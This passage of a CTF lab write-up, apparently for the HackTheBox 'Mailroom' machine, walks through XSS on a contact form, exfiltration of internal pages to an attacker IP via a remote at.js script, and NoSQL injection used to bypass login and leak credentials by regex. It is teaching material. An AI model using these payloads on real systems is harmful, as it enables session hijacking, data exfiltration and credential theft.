+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl"># Nmap done at Sun Apr 16 09:31:00 2023 -- 1 IP address (1 host up) scanned in 7.58 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="xss-vulnerability-found-in-contact-submission-form">XSS vulnerability found in contact submission form</h3>
+<p>Exploring the webpages, we find a contact page that allows us to submit questions.</p>
+<p><img src="/post/hackthebox-mailroom/Images/ContactForm.png"
+	width="1499"
+	height="782"
+	srcset="/post/hackthebox-mailroom/Images/ContactForm_hu93fd37e0a7f491dcb89241e06a79e396_49737_480x0_resize_box_3.png 480w, /post/hackthebox-mailroom/Images/ContactForm_hu93fd37e0a7f491dcb89241e06a79e396_49737_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Contact form"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="191"
+		data-flex-basis="460px"
+	
+></p>
+<p>Submitting a query suggests it might be viewed by an admin:</p>
+<p><img src="/post/hackthebox-mailroom/Images/SubmitResponse.png"
+	width="615"
+	height="136"
+	srcset="/post/hackthebox-mailroom/Images/SubmitResponse_hu027e2c4ea6401692cd29f1d9452381da_15179_480x0_resize_box_3.png 480w, /post/hackthebox-mailroom/Images/SubmitResponse_hu027e2c4ea6401692cd29f1d9452381da_15179_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Submit Response"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="452"
+		data-flex-basis="1085px"
+	
+></p>
+<p>This has potential for XSS, and since we can view it ourselves we can do an easy check:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/post/hackthebox-mailroom/Images/xss.png"
+	width="506"
+	height="198"
+	srcset="/post/hackthebox-mailroom/Images/xss_hu594f6131c53ded32d5b0eea65e7b3d2e_11060_480x0_resize_box_3.png 480w, /post/hackthebox-mailroom/Images/xss_hu594f6131c53ded32d5b0eea65e7b3d2e_11060_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="XSS Proof"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="613px"
+	
+></p>
+<p>We see successful alert message. XSS is possible. From here we can possibly grab admin information such as cookies?
+Using xss payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s2">&#34;http://10.10.14.35/?c=&#34;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On attacker machine:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nvlp <span class="m">80</span>  
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.35<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.209.135<span class="o">]</span> <span class="m">54046</span>
+</span></span><span class="line"><span class="cl">GET /?c<span class="o">=</span> HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.14.35
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/avif,image/webp,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
+</span></span><span class="line"><span class="cl">Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Referer: http://127.0.0.1/
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: <span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="sensitive-gitea-repository-accessible-in-a-subdomain">Sensitive Gitea repository accessible in a subdomain</h3>
+<p>The machine successfully reaches out, but we don&rsquo;t see any cookies. While exploring this, I had also ran subdomain enumeration:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ gobuster vhost -u http://mailroom.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.5
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:             http://mailroom.htb/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:          GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:         <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:      gobuster/3.5
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:         10s
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Append Domain:   <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2023/04/16 10:45:43 Starting gobuster in VHOST enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Found: git.mailroom.htb Status: <span class="m">200</span> <span class="o">[</span>Size: 13201<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We see a hit for <a class="link" href="http://git.mailroom.htb"  target="_blank" rel="noopener"
+    >http://git.mailroom.htb</a> so let&rsquo;s explore this site for now</p>
+<p>Exploring around without signing in, we can see a public repo for matthew named <code>staffroom</code>.</p>
+<p><img src="/post/hackthebox-mailroom/Images/GiteaStaffroom.PNG"
+	width="1168"
+	height="481"
+	srcset="/post/hackthebox-mailroom/Images/GiteaStaffroom_huc9c68d8ae9fb88f91455b3725af989fa_54143_480x0_resize_box_3.PNG 480w, /post/hackthebox-mailroom/Images/GiteaStaffroom_huc9c68d8ae9fb88f91455b3725af989fa_54143_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+		alt="Gitea repo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="582px"
+	
+></p>
+<p>In the <code>auth.php</code> file, we can see a change noted as &ldquo;fixed path bug &amp; email spam&rdquo;. The change looks potentially interesting, so we can we can check the changes with this commit.</p>
+<h4 id="information-on-a-private-subdomain-is-leaked">Information on a private subdomain is leaked</h4>
+<p><img src="/post/hackthebox-mailroom/Images/AuthphpChange.PNG"
+	width="1121"
+	height="646"
+	srcset="/post/hackthebox-mailroom/Images/AuthphpChange_hud0033e2d8e9c9f5b460be5c1f7a78d25_88369_480x0_resize_box_3.PNG 480w, /post/hackthebox-mailroom/Images/AuthphpChange_hud0033e2d8e9c9f5b460be5c1f7a78d25_88369_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="173"
+		data-flex-basis="416px"
+	
+></p>
+<p>The change is focused on not sending more 2fa requests if a minute has not passed. However, it is worth noting that we find yet another subdomain this way: <code>http://staff-review-panel.mailroom.htb</code>. Based on the sensitive nature of the title, we shouldn&rsquo;t expect to be able to access this page externally or without credentials. Visitng the page shows that it is publicly accessible, but needs some additional authentication.</p>
+<p><img src="/post/hackthebox-mailroom/Images/Forbidden.PNG"
+	width="675"
+	height="207"
+	srcset="/post/hackthebox-mailroom/Images/Forbidden_hueee7013c59b147b0e237e52f593c64c2_26957_480x0_resize_box_3.PNG 480w, /post/hackthebox-mailroom/Images/Forbidden_hueee7013c59b147b0e237e52f593c64c2_26957_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="326"
+		data-flex-basis="782px"
+	
+></p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="leveraging-xss-to-reach-the-private-subdomain">Leveraging XSS to reach the private subdomain</h3>
+<p>Recalling the XSS trick discovered earlier, we were able to redirect someone&rsquo;s or something&rsquo;s session back to our machine, although there were no cookies for that main site. Perhaps this exploited session is able to access this subdomain for us?</p>
+<p>This exploit idea is also covered in <a class="link" href="https://0xdf.gitlab.io/2021/03/20/htb-crossfit.html"  target="_blank" rel="noopener"
+    >write-ups for crossfit</a>, an insane difficulty box previously retired. The idea is to abuse XSS to perform requests as an authorized user, then relay the information back to our machine in the form of http post requests.</p>
+<p>Instead of crafting a new XSS payload every time, it is easier to write an XSS that retrieves a script from our local machine and then executes it:
+<code>&lt;script src=&quot;http://10.10.14.35/at.js&quot;&gt;&lt;/script&gt;</code></p>
+<p>To make the process even more simple, we can write the request as a curl request. Burp Repeater is good for this as well:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST http://mailroom.htb/contact.php -d <span class="s2">&#34;email=&lt;script+src%3d&#34;</span>http%3a//10.10.14.35/at.js<span class="s2">&#34;&gt;&lt;/script&gt;&amp;title=a&amp;message=a&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now when the XSS activates, it will reach back to our attacker address <code>10.10.14.35</code> and execute script from <code>at.js</code>. I can easily make quick edits to <code>at.js</code> and send another curl to execute a new command.
+at.js (inspired from 0xdf&rsquo;s crossfit writeup):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">fetch_req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">DONE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">exfil_req</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exfil_req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span> <span class="s2">&#34;http://10.10.14.35:9001&#34;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exfil_req</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Resp Code: &#34;</span> <span class="o">+</span> <span class="nx">fetch_req</span><span class="p">.</span><span class="nx">status</span> <span class="o">+</span> <span class="s2">&#34;\nPage Source:\n&#34;</span> <span class="o">+</span> <span class="nx">fetch_req</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;http://staff-review-panel.mailroom.htb/&#34;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In this script, we have a GET request pointed at staff-review-panel, then the content is sent back to our attacking machine, port 9001 as a POST.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -vlp <span class="m">9001</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.35<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.209<span class="o">]</span> <span class="m">33536</span>
+</span></span><span class="line"><span class="cl">POST / HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.14.35:9001
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Referer: http://127.0.0.1/
+</span></span><span class="line"><span class="cl">Content-Type: text/plain<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">2399</span>
+</span></span><span class="line"><span class="cl">Origin: http://127.0.0.1
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Resp Code: <span class="m">200</span>
+</span></span><span class="line"><span class="cl">Page Source:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Examining the source code a little we can find that it actually matches the gitea staffroom code. Perhaps we can access auth.php from here?</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;http://staff-review-panel.mailroom.htb/auth.php&#34;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We are able to access:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.35<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.209<span class="o">]</span> <span class="m">58294</span>
+</span></span><span class="line"><span class="cl">POST / HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.14.35:9001
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Referer: http://127.0.0.1/
+</span></span><span class="line"><span class="cl">Content-Type: text/plain<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">89</span>
+</span></span><span class="line"><span class="cl">Origin: http://127.0.0.1
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Resp Code: <span class="m">400</span>
+</span></span><span class="line"><span class="cl">Page Source:
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;success&#34;</span>:false,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Email and password are required&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It looks like we need to submit a valid username/password combination.</p>
+<h3 id="abusing-nosql-injection-to-leak-credentials">Abusing NoSQL injection to leak credentials</h3>
+<p>The Gitea source code tells us this is mongodb, so when I explore noSQL injection, we see that this is vulnerable:</p>
+<p>edits in at.js</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span> <span class="s2">&#34;http://staff-review-panel.mailroom.htb/auth.php&#34;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;email[$ne]=asdf&amp;password[$ne]=asdf&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>response:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nvlp <span class="m">9001</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.35<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.209<span class="o">]</span> <span class="m">57972</span>
+</span></span><span class="line"><span class="cl">POST / HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.14.35:9001
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Referer: http://127.0.0.1/
+</span></span><span class="line"><span class="cl">Content-Type: text/plain<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>UTF-8
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">158</span>
+</span></span><span class="line"><span class="cl">Origin: http://127.0.0.1
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Resp Code: <span class="m">401</span>
+</span></span><span class="line"><span class="cl">Page Source:
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;success&#34;</span>:false,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Invalid input detected&#34;</span><span class="o">}{</span><span class="s2">&#34;success&#34;</span>:true,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Check your inbox for an email with your 2FA token&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>By labeling email and password as <code>[$ne]</code> or &ldquo;not equal to&rdquo; asdf, we bypass login. However, we can achieve the same results with vague regex statements. By abusing regex guesses, we can piece together a valid email and password combination, letter by letter:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span> <span class="s2">&#34;http://staff-review-panel.mailroom.htb/auth.php&#34;</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">,</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;email[$regex]=^t*&amp;password[$ne]=asdf&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the above code, I designate the start of the string as <code>^</code>, guess the first letter, then wildcard the rest of the string with <code>*</code>. The regex will only pass when the guessed first letter is correct, the <code>t</code>. This method will take forever, so I used regex ranges to cover multiple letter guesses at once. By guessing half the alphabet in the first query, I can eliminate multiple letters that don&rsquo;t fit. Not as fast as creating a script to automate this, but still saves considerable time:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;email[$regex]=^t{a-m}.*&amp;password[$ne]=asdf&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This regex fails, so we know the 2nd letter is between n-z.</p>
+<p>After some time, we finally get the full email:
+<code>tristan@mailroom.htb</code>.
+Now we can do the same for passwords, but it&rsquo;s good to remember the characters might also be capitalized, numeric, or a special char. In this case, I start by setting the regex for all uppercase letters:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;email=tristan@mailroom.htb&amp;password[$regex]=^{A-Z}.*&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The first letter is not an uppercase letter, and a second query shows it is neither a lowercase letter. Next we can check any single digit number:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">fetch_req</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;email=tristan@mailroom.htb&amp;password[$regex]=^[0-9].*&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Eventually, we can leak the full password as well. Now we have credentials:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
